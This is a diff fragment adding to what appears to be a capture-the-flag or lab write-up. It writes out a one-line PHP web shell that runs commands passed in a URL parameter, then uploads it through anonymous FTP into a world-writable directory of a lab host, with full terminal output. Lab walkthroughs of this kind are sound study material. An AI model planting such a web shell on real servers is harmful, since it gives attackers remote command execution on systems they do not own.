@@ -234,3 +234,58 @@ ftp>
 ![](https://velog.velcdn.com/images/agnusdei1207/post/beba5151-64f9-4e5b-952d-0493f4f1a460/image.png)
 
 
+# webshell make
+
+┌──(kali㉿kali)-[~]
+└─$ echo '<?php system($_GET["cmd"]); ?>' > web.php
+
+# upload -> fail -> permission X
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.64.144.72
+Connected to 10.64.144.72.
+220 (vsFTPd 3.0.3)
+Name (10.64.144.72:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||17237|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
+-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+226 Directory send OK.
+ftp> put web.php
+local: web.php remote: web.php
+229 Entering Extended Passive Mode (|||19534|)
+553 Could not create file.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||42877|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> ls -al
+229 Entering Extended Passive Mode (|||60883|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
+drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
+226 Directory send OK.
+
+
+# move to writable path -> upload success
+
+ftp> put web.php
+local: web.php remote: web.php
+229 Entering Extended Passive Mode (|||50919|)
+150 Ok to send data.
+100% |*********************************************************************************|    31      172.00 KiB/s    00:00 ETA
+226 Transfer complete.
+31 bytes sent in 00:00 (0.07 KiB/s)
+ftp> 
+
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/88cc1aa2-3c03-49d7-af8a-d30a6b779c3d/image.png)
